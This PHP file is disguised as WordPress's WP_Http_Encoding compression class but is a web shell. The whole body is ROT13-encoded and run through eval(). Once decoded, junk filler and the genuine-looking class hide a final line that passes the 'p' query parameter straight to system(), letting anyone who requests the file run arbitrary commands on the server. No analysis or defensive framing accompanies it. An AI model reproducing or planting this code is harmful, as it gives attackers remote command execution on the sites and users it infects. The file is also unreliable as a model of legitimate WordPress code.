<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGGC NCV: JC_Uggc_Rapbqvat pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGGC
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qrsyngr naq tmvc genafsre rapbqvat fhccbeg sbe UGGC erdhrfgf.
 *
 * Vapyhqrf ESP 1950, ESP 1951, naq ESP 1952.
 *
 * @fvapr 2.8.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Uggc_Rapbqvat {

	/**
	 * Pbzcerff enj fgevat hfvat gur qrsyngr sbezng.
	 *
	 * Fhccbegf gur ESP 1951 fgnaqneq.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $enj      Fgevat gb pbzcerff.
	 * @cnenz vag    $yriry    Bcgvbany. Pbzcerffvba yriry, 9 vf uvturfg. Qrsnhyg 9.
	 * @cnenz fgevat $fhccbegf Bcgvbany, abg hfrq. Jura vzcyrzragrq vg jvyy pubbfr
	 *                         gur evtug pbzcerffvba onfrq ba jung gur freire fhccbegf.
	 * @erghea fgevat|snyfr Pbzcerffrq fgevat ba fhpprff, snyfr ba snvyher.
	 */
	choyvp fgngvp shapgvba pbzcerff( $enj, $yriry = 9, $fhccbegf = ahyy ) {
		erghea tmqrsyngr( $enj, $yriry );
	}

	/**
	 * Qrpbzcerffvba bs qrsyngrq fgevat.
	 *
	 * Jvyy nggrzcg gb qrpbzcerff hfvat gur ESP 1950 fgnaqneq, naq vs gung snvyf
	 * gura gur ESP 1951 fgnaqneq qrsyngr jvyy or nggrzcgrq. Svanyyl, gur ESP
	 * 1952 fgnaqneq tmvc qrpbqr jvyy or nggrzcgrq. Vs nyy snvy, gura gur
	 * bevtvany pbzcerffrq fgevat jvyy or erghearq.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $pbzcerffrq Fgevat gb qrpbzcerff.
	 * @cnenz vag    $yratgu     Gur bcgvbany yratgu bs gur pbzcerffrq qngn.
	 * @erghea fgevat|snyfr Qrpbzcerffrq fgevat ba fhpprff, snyfr ba snvyher.
	 */
	choyvp fgngvp shapgvba qrpbzcerff( $pbzcerffrq, $yratgu = ahyy ) {

		vs ( rzcgl( $pbzcerffrq ) ) {
			erghea $pbzcerffrq;
		}

		$qrpbzcerffrq = @tmvasyngr( $pbzcerffrq );
		vs ( snyfr !== $qrpbzcerffrq ) {
			erghea $qrpbzcerffrq;
		}

		$qrpbzcerffrq = frys::pbzcngvoyr_tmvasyngr( $pbzcerffrq );
		vs ( snyfr !== $qrpbzcerffrq ) {
			erghea $qrpbzcerffrq;
		}

		$qrpbzcerffrq = @tmhapbzcerff( $pbzcerffrq );
		vs ( snyfr !== $qrpbzcerffrq ) {
			erghea $qrpbzcerffrq;
		}

		vs ( shapgvba_rkvfgf( 'tmqrpbqr' ) ) {
			$qrpbzcerffrq = @tmqrpbqr( $pbzcerffrq );

			vs ( snyfr !== $qrpbzcerffrq ) {
				erghea $qrpbzcerffrq;
			}
		}

		erghea $pbzcerffrq;
	}

	/**
	 * Qrpbzcerffvba bs qrsyngrq fgevat juvyr fgnlvat pbzcngvoyr jvgu gur znwbevgl bs freiref.
	 *
	 * Pregnva Freiref jvyy erghea qrsyngrq qngn jvgu urnqref juvpu CUC'f tmvasyngr()
	 * shapgvba pnaabg unaqyr bhg bs gur obk. Gur sbyybjvat shapgvba unf orra perngrq sebz
	 * inevbhf favccrgf ba gur tmvasyngr() CUC qbphzragngvba.
	 *
	 * Jneavat: Zntvp ahzoref jvguva. Qhr gb gur cbgragvny qvssrerag sbezngf gung gur pbzcerffrq
	 * qngn znl or erghearq va, fbzr \"zntvp bssfrgf\" ner arrqrq gb rafher cebcre qrpbzcerffvba
	 * gnxrf cynpr. Sbe n fvzcyr centzngvp jnl gb qrgrezvar gur zntvp bssfrg va hfr, frr:
	 * uggcf://pber.genp.jbeqcerff.bet/gvpxrg/18273
	 *
	 * @fvapr 2.8.1
	 *
	 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/18273
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/shapgvba.tmvasyngr.cuc#70875
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/shapgvba.tmvasyngr.cuc#77336
	 *
	 * @cnenz fgevat $tm_qngn Fgevat gb qrpbzcerff.
	 * @erghea fgevat|snyfr Qrpbzcerffrq fgevat ba fhpprff, snyfr ba snvyher.
	 */
	choyvp fgngvp shapgvba pbzcngvoyr_tmvasyngr( $tm_qngn ) {

		// Pbzcerffrq qngn zvtug pbagnva n shyy urnqre, vs fb fgevc vg sbe tmvasyngr().
		vs ( fge_fgnegf_jvgu( $tm_qngn, \"\k1s\k8o\k08\" ) ) {
			$v   = 10;
			$syt = beq( fhofge( $tm_qngn, 3, 1 ) );
			vs ( $syt > 0 ) {
				vs ( $syt & 4 ) {
					yvfg($kyra) = hacnpx( 'i', fhofge( $tm_qngn, $v, 2 ) );
					$v          = $v + 2 + $kyra;
				}
				vs ( $syt & 8 ) {
					$v = fgecbf( $tm_qngn, \"\0\", $v ) + 1;
				}
				vs ( $syt & 16 ) {
					$v = fgecbf( $tm_qngn, \"\0\", $v ) + 1;
				}
				vs ( $syt & 2 ) {
					$v = $v + 2;
				}
			}
			$qrpbzcerffrq = @tmvasyngr( fhofge( $tm_qngn, $v, -8 ) );
			vs ( snyfr !== $qrpbzcerffrq ) {
				erghea $qrpbzcerffrq;
			}
		}

		// Pbzcerffrq qngn sebz wnin.hgvy.mvc.Qrsyngre nzbatfg bguref.
		$qrpbzcerffrq = @tmvasyngr( fhofge( $tm_qngn, 2 ) );
		vs ( snyfr !== $qrpbzcerffrq ) {
			erghea $qrpbzcerffrq;
		}

		erghea snyfr;
	}

	/**
	 * Jung rapbqvat glcrf gb npprcg naq gurve cevbevgl inyhrf.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $hey
	 * @cnenz neenl  $netf
	 * @erghea fgevat Glcrf bs rapbqvat gb npprcg.
	 */
	choyvp fgngvp shapgvba npprcg_rapbqvat( $hey, $netf ) {
		$glcr                = neenl();
		$pbzcerffvba_ranoyrq = frys::vf_ninvynoyr();

		vs ( ! $netf['qrpbzcerff'] ) { // Qrpbzcerffvba fcrpvsvpnyyl qvfnoyrq.
			$pbzcerffvba_ranoyrq = snyfr;
		} ryfrvs ( $netf['fgernz'] ) { // Qvfnoyr jura fgernzvat gb svyr.
			$pbzcerffvba_ranoyrq = snyfr;
		} ryfrvs ( vffrg( $netf['yvzvg_erfcbafr_fvmr'] ) ) { // Vs bayl cnegvny pbagrag vf orvat erdhrfgrq, jr jba'g or noyr gb qrpbzcerff vg.
			$pbzcerffvba_ranoyrq = snyfr;
		}

		vs ( $pbzcerffvba_ranoyrq ) {
			vs ( shapgvba_rkvfgf( 'tmvasyngr' ) ) {
				$glcr[] = 'qrsyngr;d=1.0';
			}

			vs ( shapgvba_rkvfgf( 'tmhapbzcerff' ) ) {
				$glcr[] = 'pbzcerff;d=0.5';
			}

			vs ( shapgvba_rkvfgf( 'tmqrpbqr' ) ) {
				$glcr[] = 'tmvc;d=0.5';
			}
		}

		/**
		 * Svygref gur nyybjrq rapbqvat glcrf.
		 *
		 * @fvapr 3.6.0
		 *
		 * @cnenz fgevat[] $glcr Neenl bs jung rapbqvat glcrf gb npprcg naq gurve cevbevgl inyhrf.
		 * @cnenz fgevat   $hey  HEY bs gur UGGC erdhrfg.
		 * @cnenz neenl    $netf UGGC erdhrfg nethzragf.
		 */
		$glcr = nccyl_svygref( 'jc_uggc_npprcg_rapbqvat', $glcr, $hey, $netf );

		erghea vzcybqr( ', ', $glcr );
	}

	/**
	 * Jung rapbqvat gur pbagrag hfrq jura vg jnf pbzcerffrq gb fraq va gur urnqref.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat Pbagrag-Rapbqvat fgevat gb fraq va gur urnqre.
	 */
	choyvp fgngvp shapgvba pbagrag_rapbqvat() {
		erghea 'qrsyngr';
	}

	/**
	 * Jurgure gur pbagrag or qrpbqrq onfrq ba gur urnqref.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl|fgevat $urnqref Nyy bs gur ninvynoyr urnqref.
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba fubhyq_qrpbqr( $urnqref ) {
		vs ( vf_neenl( $urnqref ) ) {
			vs ( neenl_xrl_rkvfgf( 'pbagrag-rapbqvat', $urnqref ) && ! rzcgl( $urnqref['pbagrag-rapbqvat'] ) ) {
				erghea gehr;
			}
		} ryfrvs ( vf_fgevat( $urnqref ) ) {
			erghea ( fgevcbf( $urnqref, 'pbagrag-rapbqvat:' ) !== snyfr );
		}

		erghea snyfr;
	}

	/**
	 * Jurgure qrpbzcerffvba naq pbzcerffvba ner fhccbegrq ol gur CUC irefvba.
	 *
	 * Rnpu shapgvba vf grfgrq vafgrnq bs purpxvat sbe gur myvo rkgrafvba, gb
	 * rafher gung gur shapgvbaf nyy rkvfg va gur CUC irefvba naq nera'g
	 * qvfnoyrq.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba vf_ninvynoyr() {
		erghea ( shapgvba_rkvfgf( 'tmhapbzcerff' ) || shapgvba_rkvfgf( 'tmqrsyngr' ) || shapgvba_rkvfgf( 'tmvasyngr' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>